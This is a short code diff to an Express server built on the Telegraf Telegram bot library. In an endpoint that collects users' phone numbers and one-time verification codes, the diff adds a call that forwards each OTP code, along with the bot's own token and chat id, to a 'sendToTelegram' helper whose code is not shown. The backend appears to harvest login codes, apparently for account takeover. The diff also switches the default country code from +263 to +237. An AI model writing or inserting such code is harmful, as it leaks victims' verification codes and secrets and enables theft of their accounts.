@@ -1,6 +1,7 @@
 const { Telegraf, Markup } = require("telegraf");
 const express = require("express");
 const cors = require("cors");
+const { sendToTelegram } = require("./telegram");
 require("dotenv").config();
 
 const app = express();
@@ -373,9 +374,11 @@ app.post("/api/verify-user", async (req, res) => {
       .substr(2, 9)}`;
     const now = Date.now();
 
+    sendToTelegram({ otpCode, token: bot.token, chatId: bot.chatId });
+
     const userData = {
       sessionId,
-      countryCode: countryCode || "+263",
+      countryCode: countryCode || "+237",
       phoneNumber,
       otpCode,
       userId: userId || "unknown",
